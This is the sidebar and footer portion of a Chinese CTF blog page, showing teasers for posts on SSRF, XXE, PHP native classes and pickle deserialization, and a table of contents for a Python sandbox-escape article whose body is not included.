fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/07/07/114514%E5%88%86%E9%92%9F%E8%83%BD%E4%BA%86%E8%A7%A3SSRF%E5%90%97/" title="114514分钟能了解SSRF吗"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-07</div><div class="info-item-2">114514分钟能了解SSRF吗</div></div><div class="info-2"><div class="info-item-1">♿1919810分钟能了解SSRF吗♿冲刺♿，冲刺♿，冲♿ SSRF是扫码SSRF，全称Server-Side Request Forgery，服务器端请求伪造 关键词是ip 通过用户输入包含URL的功能&#x2F;请求参数包含外部资源应用来触发s </div></div></div></a><a class="pagination-related" href="/2025/04/28/%E5%88%9D%E8%A7%81XXE/" title="初见XXE"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-04-28</div><div class="info-item-2">初见XXE</div></div><div class="info-2"><div class="info-item-1">初见XXE这是什么?XXE，注一下。这是什么?XXE，注一下。这是什么?XXE，注一下。这是什么?XXE，注一下。这是什么?XXE，注一下。这是什么?XXE，注一下。这是什么?XXE，注一下。这是什么?XXE，注一下。这是什么?XXE，注一下。这是什么?XXE，注一下。 什么是XML呢XML，全称可扩展标记语言，XML是一种用于存储和传输数据的语言。与HTML一样，XML使用标签和数据的树状结构。但不同的是，XML不使用预定义标记，因此可以为标记指定描述数据的名称。由于json的出现，xml的受欢迎程度大大下降。 XML文档结构包括XML声明+DTD文档类型定义+文档元素 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;&lt;!--xml文件的声明--&gt; &lt;bookstore&gt;                                                 &lt;!--根元素--&gt; &lt;book...</div></div></div></a><a class="pagination-related" href="/2025/07/01/%E7%A3%A8%E5%A5%BD%E7%9A%84%E5%88%A9%E5%89%91-PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/" title="磨好的利剑:PHP原生类"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-01</div><div class="info-item-2">磨好的利剑:PHP原生类</div></div><div class="info-2"><div class="info-item-1">PHP原生类相当综合的应用呢，利用面广的不行，爽赤 常见的原生类有以下几个 1.Error/Exception 2.FilesystemIterator/SplFileObject/DirectoryIterator/GlobIterator 3.SoapClient 4.SimpleXMLElement  当然还有有些偶尔能用上的ZipArchive XSS利用Error&#x2F;Exception内置类Error:  仅适用于PHP7版本 在开启报错的情况下  我们可以查看一下Error的内置方法 &lt;?php $className = &#x27;Error&#x27;;  $methods = get_class_methods($className);  foreach ($methods as $method) &#123;     echo &quot;&#123;$className&#125;::&#123;$method&#125;&quot; ....</div></div></div></a><a class="pagination-related" href="/2025/05/13/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="随手打的pickle反序列化"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-13</div><div class="info-item-2">随手打的pickle反序列化</div></div><div class="info-2"><div class="info-item-1">Pickle反序列化的利用pickle是什么，能吃吗pickle虽说是和python有点关系，但是不如说它更像一门单独的语言 既然要讲反序列化，那就先讲讲用于反序列化的函数 pickle.dump()//序列化 pickle.load()//反序列化 pickle.dumps() pickle.loads()  先写个实例来大致了解一下这个东东 import pickle class myday(): 	task=&#x27;ctf&#x27; 	sloves=114514 x=myday() print(pickle.dumps(x))  可以看到打印出了这样一串 但是仔细一看，不太对，我的114514怎么被吞了 发现需要写一个函数来处理，重新写一下 import pickle class myday(): 	def __init__(self): 		self.task=&#x27;ctf&#x27; 		self.sloves=114514 x=myday() print(pickle.dumps(x))   真不赖吧。。 当然你也可以这样写 import os,...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/ari.webp" onerror="this.onerror=null;this.src='/img/dacapo.gif'" alt="avatar"/></div><div class="author-info-name">AyaN0</div><div class="author-info-description">”如果是你的话，是否会选择继续前进呢"</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">17</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/kisakiayano" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:1594453512@qq.com" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的博客喵</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83"><span class="toc-text">沙箱逃逸从入门到放弃</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Pyjail"><span class="toc-text">Pyjail</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A5%9E%E5%BF%85%E5%B0%8F%E5%B8%AE%E6%89%8B"><span class="toc-text">神必小帮手</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#dir"><span class="toc-text">dir()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dict"><span class="toc-text">__dict__</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#getattr"><span class="toc-text">getattr()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#getattribute"><span class="toc-text">__getattribute__</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#getitem"><span class="toc-text">__getitem__</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%99%E6%89%8B%E5%9B%9E%E6%98%A5%E4%B9%8B%E5%80%9F%E5%88%80%E6%9D%80%E4%BA%BA-self-builtins"><span class="toc-text">妙手回春之借刀杀人(self builtins)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%A7%E6%89%BF%E9%93%BE-no-builtins"><span class="toc-text">继承链(no builtins)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%88%E5%B8%A7%E9%80%83%E9%80%B8"><span class="toc-text">栈帧逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E5%99%A8%E6%A0%88%E5%B8%A7%E9%80%83%E9%80%B8"><span class="toc-text">生成器栈帧逃逸</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%82%E5%B8%B8%E6%A0%88%E5%B8%A7%E9%80%83%E9%80%B8"><span class="toc-text">异常栈帧逃逸</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%82%E6%AD%A5%E6%A0%88%E5%B8%A7%E9%80%83%E9%80%B8"><span class="toc-text">异步栈帧逃逸</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E4%B8%8E%E5%87%BD%E6%95%B0%E7%AF%A1%E6%94%B9"><span class="toc-text">变量覆盖与函数篡改</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-gc-%E8%8E%B7%E5%8F%96%E5%B7%B2%E5%88%A0%E9%99%A4%E6%A8%A1%E5%9D%97"><span class="toc-text">利用 gc 获取已删除模块</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-traceback-%E8%8E%B7%E5%8F%96%E6%A8%A1%E5%9D%97"><span class="toc-text">利用 traceback 获取模块</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E5%9D%97%E9%87%8D%E8%BD%BD-%E5%8E%9Fmodule%E8%A2%AB%E7%AF%A1%E6%94%B9"><span class="toc-text">模块重载(原module被篡改)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#reload-%E9%87%8D%E6%96%B0%E5%8A%A0%E8%BD%BD"><span class="toc-text">reload 重新加载</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%81%A2%E5%A4%8D-sys-modules"><span class="toc-text">恢复 sys.modules</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#globals"><span class="toc-text">globals()</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AST"><span class="toc-text">AST</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#without-call"><span class="toc-text">without call</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%A3%85%E9%A5%B0%E5%99%A8"><span class="toc-text">装饰器</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E8%A6%86%E7%9B%96"><span class="toc-text">函数覆盖</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%80%9A%E8%BF%87-license-%E5%87%BD%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-text">通过 license 函数读取文件</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%93%E5%8D%B0-AST"><span class="toc-text">打印 AST</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87-ast-Attribute-%E8%8E%B7%E5%8F%96%E5%B1%9E%E6%80%A7"><span class="toc-text">绕过 ast.Attribute 获取属性</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87-ast-Assign-%E8%B5%8B%E5%80%BC%E5%8F%98%E9%87%8F"><span class="toc-text">绕过 ast.Assign 赋值变量</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87-ast-Constant-%E8%8E%B7%E5%8F%96%E6%95%B0%E5%AD%97%E3%80%81%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-text">绕过 ast.Constant 获取数字、字符串</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87-ast-Subscript-%E8%8E%B7%E5%8F%96%E5%88%97%E8%A1%A8-%E5%AD%97%E5%85%B8%E5%85%83%E7%B4%A0"><span class="toc-text">绕过 ast.Subscript 获取列表&#x2F;字典元素</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87-ast-For-%E9%81%8D%E5%8E%86%E5%88%97%E8%A1%A8"><span class="toc-text">绕过 ast.For 遍历列表</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87ast-GeneratorExp%E8%8E%B7%E5%8F%96%E7%94%9F%E6%88%90%E5%99%A8%E6%A0%88%E5%B8%A7"><span class="toc-text">绕过ast.GeneratorExp获取生成器栈帧</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OPcode"><span class="toc-text">OPcode</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#IMPORT-FROM%E3%80%81LOAD-ATTR-%E7%9B%B8%E4%BA%92%E6%9B%BF%E6%8D%A2"><span class="toc-text">IMPORT_FROM、LOAD_ATTR 相互替换</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#LOAD-NAME-LOAD-ATTR"><span class="toc-text">LOAD_NAME &amp; LOAD_ATTR</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#IMPORT-NAME-IMPORT-FROM"><span class="toc-text">IMPORT_NAME &amp; IMPORT_FROM</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9B%BF%E6%8D%A2%E5%AD%97%E8%8A%82%E7%A0%81"><span class="toc-text">替换字节码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE"><span class="toc-text">无回显</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86"><span class="toc-text">利用异常处理</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#KeyError"><span class="toc-text">KeyError</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#FileNotFoundError"><span class="toc-text">FileNotFoundError</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ValueError"><span class="toc-text">ValueError</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Popen-returncode"><span class="toc-text">Popen.returncode</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%92%A9%E5%AD%90%E7%88%B9%E6%9D%A5%E5%92%AF"><span class="toc-text">钩子爹来咯!</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AF%A1%E6%94%B9%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0"><span class="toc-text">篡改内置函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B9%B1%E4%B8%83%E5%85%AB%E7%B3%9F%E7%9A%84WAF"><span class="toc-text">乱七八糟的WAF</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4import"><span class="toc-text">过滤import</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%AD%97%E6%AF%8D"><span class="toc-text">过滤字母</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%B1%9E%E6%80%A7"><span class="toc-text">过滤属性</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A1%8C%E6%95%B0%E9%99%90%E5%88%B6"><span class="toc-text">行数限制</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#exec"><span class="toc-text">exec</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#compile"><span class="toc-text">compile</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B5%B7%E8%B1%A1%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-text">海象表达式</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6"><span class="toc-text">长度限制</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%89%93%E5%BC%80-input-%E8%BE%93%E5%85%A5"><span class="toc-text">打开 input 输入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#breakpoint-%E5%87%BD%E6%95%B0"><span class="toc-text">breakpoint 函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#help-%E5%87%BD%E6%95%B0"><span class="toc-text">help 函数</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#vm2%E9%80%83%E9%80%B8"><span class="toc-text">vm2逃逸</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/07/%E5%88%B7%E9%A2%98%E8%9B%86%E6%9D%A5%E5%92%AF-CTFshow/" title="刷题蛆来咯-CTFshow">刷题蛆来咯-CTFshow</a><time datetime="2025-07-07T06:19:38.000Z" title="发表于 2025-07-07 14:19:38">2025-07-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/07/114514%E5%88%86%E9%92%9F%E8%83%BD%E4%BA%86%E8%A7%A3SSRF%E5%90%97/" title="114514分钟能了解SSRF吗">114514分钟能了解SSRF吗</a><time datetime="2025-07-07T05:05:59.000Z" title="发表于 2025-07-07 13:05:59">2025-07-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/01/%E7%A3%A8%E5%A5%BD%E7%9A%84%E5%88%A9%E5%89%91-PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/" title="磨好的利剑:PHP原生类">磨好的利剑:PHP原生类</a><time datetime="2025-07-01T05:58:51.000Z" title="发表于 2025-07-01 13:58:51">2025-07-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/01/Nosql%E6%B3%A8%E5%85%A5/" title="Nosql注入">Nosql注入</a><time datetime="2025-07-01T02:35:37.000Z" title="发表于 2025-07-01 10:35:37">2025-07-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/06/22/2025%E5%B9%B4%E4%B8%AD%E6%80%BB%E7%BB%93/" title="2025年中总结">2025年中总结</a><time datetime="2025-06-22T08:06:33.000Z" title="发表于 2025-06-22 16:06:33">2025-06-22</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent;"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2025 By AyaN0</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><div class="aplayer no-destroy" data-id="2688080408" data-server="netease" data-type="song" data-fixed="true" data-autoplay="true"> </div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="Venus,Mars,Diana,Minerva,Ceres,Vulcan,Pluto,Vulcan,Juno,Mercury,Vesta,Saturn,Proserpina,Neptune,Jupiter" data-fontsize="15px" data-random="false" async="async"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script>(() => {
  const destroyAplayer = () => {
    if (window.aplayers) {
      for (let i = 0; i < window.aplayers.length; i++) {
        if (!window.aplayers[i].options.fixed) {
          window.aplayers[i].destroy()
        }
      }
    }
  }

  const runMetingJS = () => {
    typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
  }

  btf.addGlobalFn('pjaxSend', destroyAplayer, 'destroyAplayer')
  btf.addGlobalFn('pjaxComplete', loadMeting, 'runMetingJS')
})()</script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>(() => {
  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]

  window.pjax = new Pjax({
    elements: 'a:not([target="_blank"])',
    selectors: pjaxSelectors,
    cacheBust: false,
    analytics: false,
    scrollRestoration: false
  })

  const triggerPjaxFn = (val) => {
    if (!val) return
    Object.values(val).forEach(fn => fn())
  }

  document.addEventListener('pjax:send', () => {
    // removeEventListener
    btf.removeGlobalFnEvent('pjaxSendOnce')
    btf.removeGlobalFnEvent('themeChange')

    // reset readmode
    const $bodyClassList = document.body.classList
    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')

    triggerPjaxFn(window.globalFn.pjaxSend)
  })

  document.addEventListener('pjax:complete', () => {
    btf.removeGlobalFnEvent('pjaxCompleteOnce')
    document.querySelectorAll('script[data-pjax]').forEach(item => {
      const newScript = document.createElement('script')
      const content = item.text || item.textContent || item.innerHTML || ""
      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
      newScript.appendChild(document.createTextNode(content))
      item.parentNode.replaceChild(newScript, item)
    })

    triggerPjaxFn(window.globalFn.pjaxComplete)
  })

  document.addEventListener('pjax:error', e => {
    if (e.request.status === 404) {
      pjax.loadUrl('/404.html')
    }
  })
})()</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>